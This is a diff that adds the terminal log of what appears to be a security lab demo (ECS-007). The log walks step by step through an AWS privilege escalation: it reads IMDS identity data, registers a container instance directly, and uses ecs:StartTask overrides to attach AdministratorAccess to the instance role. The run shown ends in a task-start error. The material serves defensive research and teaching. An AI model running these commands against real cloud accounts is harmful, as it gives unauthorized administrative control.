@@ -1,0 +1,116 @@
+[0;32m========================================[0m
+[0;32mECS RegisterContainerInstance + PassRole[0m
+[0;32m+ StartTask Override Privilege Escalation[0m
+[0;32mDemo (ECS-007)[0m
+[0;32m========================================[0m
+
+[0;34mStarting principal: EC2 instance role (pl-prod-ecs-007-to-admin-instance-role)[0m
+[0;34mAttack permissions: ecs:RegisterContainerInstance, ecs:StartTask,[0m
+[0;34m                    iam:PassRole, ecs:DeregisterContainerInstance[0m
+[0;34m[0m
+[0;34mThis demo uses SSM to simulate RCE (shell access on the EC2).[0m
+[0;34mIn the real world, initial access would be via an application vulnerability.[0m
+[0;34mAll attack commands run on the EC2 using the instance role's IMDS credentials.[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+EC2 Instance ID: i-08c6a101fb3737d1c
+Instance Role (starting principal): arn:aws:iam::123456789012:role/pl-prod-ecs-007-to-admin-instance-role
+Region: us-east-1
+ECS Cluster: pl-prod-ecs-007-cluster
+Target Role ARN: arn:aws:iam::123456789012:role/pl-prod-ecs-007-to-admin-target-role
+ReadOnly Key ID: AKIA2E4JP2...
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] No helpful permissions to restrict[0m
+[1;33mStep 2: Setting up SSM access to EC2 (simulating RCE)[0m
+[2m(In the real world, the attacker has shell access via an application vulnerability)[0m
+[0;32m✓ SSM access configured (RCE simulation)[0m
+
+Checking SSM agent connectivity for instance i-08c6a101fb3737d1c...
+[0;32m✓ SSM agent is online[0m
+
+[1;33mStep 3: Verifying identity on the compromised EC2[0m
+Running sts:GetCallerIdentity on the EC2 instance...
+
+[0;36m[Attacker] $ aws sts get-caller-identity[0m
+{
+  "Account": "697683661464",
+  "UserId": "AROA2E4JP2KMHQ4CHFRCR:i-08c6a101fb3737d1c",
+  "Arn": "arn:aws:sts::123456789012:assumed-role/pl-prod-ecs-007-to-admin-instance-role/i-08c6a101fb3737d1c"
+}
+[0;32m✓ Confirmed: Running as instance role on EC2[0m
+
+[1;33mStep 4: Verifying instance role does NOT have admin permissions yet[0m
+Attempting to list IAM users from EC2 (should fail)...
+
+[0;36m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Instance role cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Verifying ECS cluster is EMPTY (no container instances)[0m
+Cluster: pl-prod-ecs-007-cluster
+[0;34mThe EC2 instance exists but its ECS agent points to a non-existent cluster.[0m
+[0;34mThe attacker will call ecs:RegisterContainerInstance directly via the API.[0m
+[2m[ReadOnly] $ aws ecs list-container-instances --cluster pl-prod-ecs-007-cluster[0m
+[0;32m✓ Confirmed: Cluster is EMPTY - no container instances (as expected)[0m
+
+[1;33mStep 6: Calling ecs:RegisterContainerInstance directly via API from EC2[0m
+[0;34mThe attacker retrieves the instance identity document and signature from IMDS,[0m
+[0;34mthen calls ecs:RegisterContainerInstance directly (not through the ECS agent).[0m
+[0;34mThis registers the EC2 instance with the target ECS cluster.[0m
+[0;34mReference: https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path[0m
+
+
+[0;36m[Attacker] $ curl -s http://169.254.169.254/latest/dynamic/instance-identity/document[0m
+
+[0;36m[Attacker] $ curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature[0m
+
+[0;36m[Attacker] $ aws ecs register-container-instance --cluster pl-prod-ecs-007-cluster --instance-identity-document $IDENTITY_DOC --instance-identity-document-signature $IDENTITY_SIG --total-resources '[...]'[0m
+Container Instance ARN: arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-007-cluster/8e89f59adf39451ab22717eee327b058
+[0;32m✓ Successfully registered EC2 to cluster via direct API call[0m
+
+[1;33mStep 7: Reconfiguring ECS agent to connect to the target cluster[0m
+[0;34mNow that the EC2 is registered via direct API call, the attacker reconfigures[0m
+[0;34mthe ECS agent to connect to the cluster. The agent will update the container[0m
+[0;34minstance with proper capability attributes (Docker version, OS type, etc.)[0m
+[0;34mneeded for task placement.[0m
+
+
+[0;36m[Attacker] $ sed -i 's/pl-prod-ecs-007-holding/pl-prod-ecs-007-cluster/' /etc/ecs/ecs.config && systemctl restart ecs[0m
+ECS agent reconfigured and restarted
+[0;32m✓ ECS agent reconfigured to join cluster: pl-prod-ecs-007-cluster[0m
+
+[1;33mStep 8: Waiting for ECS agent to connect to cluster[0m
+[0;34mThe agent creates its own registration with full capability attributes[0m
+[0;34m(Docker version, OS type, networking, etc.) needed for task placement.[0m
+
+Attempt 1: Found agent-connected container instance
+[0;32m✓ ECS agent connected to cluster with full capability attributes[0m
+Agent Container Instance ARN: arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-007-cluster/8e89f59adf39451ab22717eee327b058
+Waiting 15 seconds for container instance attributes to propagate...
+
+[1;33mStep 9: Discovering existing task definitions[0m
+Listing task definitions from EC2...
+
+[0;36m[Attacker] $ aws ecs list-task-definitions --family-prefix pl-prod-ecs-007-existing-task --region us-east-1[0m
+arn:aws:ecs:us-east-1:123456789012:task-definition/pl-prod-ecs-007-existing-task:5
+
+[0;34mKey insight: We do NOT need ecs:RegisterTaskDefinition.[0m
+[0;34mWe exploit the existing task definition using ecs:StartTask --overrides[0m
+[0;34mto override both the command AND the taskRoleArn.[0m
+[0;32m✓ Identified existing task definition to exploit[0m
+
+[1;33mStep 10: Starting ECS task with command and role overrides from EC2[0m
+Cluster: pl-prod-ecs-007-cluster
+Task Definition: pl-prod-ecs-007-existing-task
+Container Instance: arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-007-cluster/8e89f59adf39451ab22717eee327b058
+
+[0;34mOverrides being applied:[0m
+  - taskRoleArn: arn:aws:iam::123456789012:role/pl-prod-ecs-007-to-admin-target-role (admin role)
+  - command: aws iam attach-role-policy --role-name pl-prod-ecs-007-to-admin-instance-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+This task will attach AdministratorAccess to the instance role: pl-prod-ecs-007-to-admin-instance-role
+
+
+[0;36m[Attacker] $ aws ecs start-task --cluster pl-prod-ecs-007-cluster --task-definition pl-prod-ecs-007-existing-task --container-instances arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-007-cluster/8e89f59adf39451ab22717eee327b058 --overrides file:///tmp/overrides.json[0m
+[0;31mError: Task start reported failure: ATTRIBUTE[0m
+None	ATTRIBUTE
